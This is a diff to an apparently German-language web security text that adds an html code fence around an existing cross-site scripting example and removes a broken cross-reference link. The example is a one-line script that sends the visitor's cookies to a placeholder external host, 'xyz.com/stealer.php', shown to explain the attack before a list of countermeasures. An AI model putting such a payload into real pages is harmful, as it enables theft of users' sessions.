@@ -306,8 +306,10 @@ Beispiel für ein einfaches Javascript-Fragment welches ein Redirect auf
 einen externen Server (xyz.com) durchführt und als GET-Parameter die
 aktuellen Cookies übergibt:
 
+```html
     <script>location.href = 'http://xyz.com/stealer.php?cookie='+document.cookie;
     </script>
+```
 
 Folgende Gegenmaßnahmen sollten implementiert werden:
 
@@ -456,5 +458,3 @@ werden.
 Facebook-Kontos auch als kritisch eingeschätzt werden.
 
 [3] Siehe auch das XSS-Kapitel
-<a href="#xss" data-reference-type="ref" data-reference="xss">[xss]</a>,
-Seite
